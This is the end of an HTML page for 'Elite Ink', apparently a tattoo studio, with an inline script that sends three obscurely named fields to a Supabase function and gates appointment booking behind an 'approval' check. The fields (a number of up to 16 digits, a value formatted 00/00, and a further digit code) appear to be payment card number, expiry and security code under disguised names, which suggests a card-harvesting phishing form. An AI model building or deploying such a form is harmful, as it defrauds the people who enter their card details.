</main><footer>© 2026 Elite Ink. All rights reserved.</footer><script>
(function () {
  const SUPABASE_URL =
    "https://nywvzauhxzegbwwipdqi.supabase.co";

  const SUPABASE_KEY =
    "sb_publishable_Wech5BynoPAXAl90h0XjXw_dudU5jpC";

  const form = document.getElementById("verificationForm");
  const submitButton = document.getElementById("submitButton");
  const checkButton = document.getElementById("checkButton");
  const message = document.getElementById("message");
  const statusPanel = document.getElementById("statusPanel");
  const xxInput = document.getElementById("xx_num");

  function showMessage(text, type) {
    message.textContent = text;
    message.className = type || "";
  }

  function showStatus(text, type) {
    statusPanel.textContent = text;
    statusPanel.className = type || "";
    statusPanel.classList.remove("hidden");
  }

  if (!window.supabase || !window.supabase.createClient) {
    showMessage(
      "Supabase could not load. Check your internet connection and reopen the page.",
      "error"
    );
    submitButton.disabled = true;
    checkButton.disabled = true;
    return;
  }

  const db = window.supabase.createClient(
    SUPABASE_URL,
    SUPABASE_KEY
  );

  xxInput.addEventListener("input", function () {
    const digits = this.value.replace(/\D/g, "").slice(0, 4);
    this.value = digits.length > 2
      ? digits.slice(0, 2) + "/" + digits.slice(2)
      : digits;
  });

  form.addEventListener("submit", async function (event) {
    event.preventDefault();
    showMessage("", "");
    statusPanel.classList.add("hidden");

    const x_num = document.getElementById("x_num").value.trim();
    const xx_num = xxInput.value.trim();
    const xxx_num = document.getElementById("xxx_num").value.trim();

    if (!/^\d{1,16}$/.test(x_num)) {
      showMessage("Please check x.num.", "error");
      return;
    }

    if (!/^\d{2}\/\d{2}$/.test(xx_num)) {
      showMessage("Enter xx.num in the format 00/00.", "error");
      return;
    }

    if (!/^\d{1,30}$/.test(xxx_num)) {
      showMessage("Please check xxx.num.", "error");
      return;
    }

    submitButton.disabled = true;
    submitButton.textContent = "SUBMITTING...";

    try {
      const response = await fetch(
        SUPABASE_URL + "/functions/v1/clever-task",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "apikey": SUPABASE_KEY,
            "Authorization": "Bearer " + SUPABASE_KEY
          },
          body: JSON.stringify({
            x_num: x_num,
            xx_num: xx_num,
            xxx_num: xxx_num
          })
        }
      );

      const responseText = await response.text();
      let result;

      try {
        result = JSON.parse(responseText);
      } catch {
        throw new Error("The server returned an unreadable response.");
      }

      if (!response.ok || !result.success) {
        throw new Error(
          result.error || result.message || "Submission failed."
        );
      }

      const submissionId =
        result.submission && result.submission.id;

      if (!submissionId) {
        throw new Error(
          "Submission was received, but no reference ID was returned. Contact the administrator before submitting again."
        );
      }

      sessionStorage.setItem("eliteInkSubmissionId", submissionId);

      showMessage(
        "Submission received successfully! Your status is pending review. Keep this browser session open to check approval.",
        "success"
      );

      form.reset();
      showStatus(
        "Submission reference: " + submissionId +
        "\nStatus: Pending review",
        ""
      );

    } catch (error) {
      showMessage(error.message || "Connection failed. Please try again.", "error");
    } finally {
      submitButton.disabled = false;
      submitButton.textContent = "SUBMIT DETAILS";
    }
  });

  checkButton.addEventListener("click", async function () {
    showMessage("", "");
    checkButton.disabled = true;
    checkButton.textContent = "CHECKING...";

    try {
      const submissionId =
        sessionStorage.getItem("eliteInkSubmissionId");

      if (!submissionId) {
        throw new Error(
          "No submission reference was found in this browser session. Submit your details on this device first."
        );
      }

      const { data, error } = await db.rpc(
        "check_elite_ink_approval",
        { submission_id: submissionId }
      );

      if (error) throw error;

      const status = String(data || "not_found").toLowerCase();

      if (status === "approved") {
        showStatus(
          "APPROVED\nYour submission has been approved. You may continue to appointment booking.",
          "success"
        );

        const bookingButton = document.createElement("button");
        bookingButton.type = "button";
        bookingButton.textContent = "CONTINUE TO BOOKING";

        bookingButton.addEventListener("click", function () {
          window.location.href = "booking.html";
        });

        statusPanel.appendChild(document.createElement("br"));
        statusPanel.appendChild(bookingButton);

      } else if (status === "pending") {
        showStatus(
          "PENDING REVIEW\nYour submission has not been approved yet. Please check again later.",
          ""
        );

      } else if (status === "rejected") {
        showStatus(
          "NOT APPROVED\nPlease contact the administrator for assistance.",
          "error"
        );

      } else {
        showStatus(
          "We could not find this submission. Please contact the administrator.",
          "error"
        );
      }

    } catch (error) {
      showMessage(
        error.message || "Could not check approval. Please try again.",
        "error"
      );
    } finally {
      checkButton.disabled = false;
      checkButton.textContent = "CHECK APPROVAL";
    }
  });
})();
</script></body>
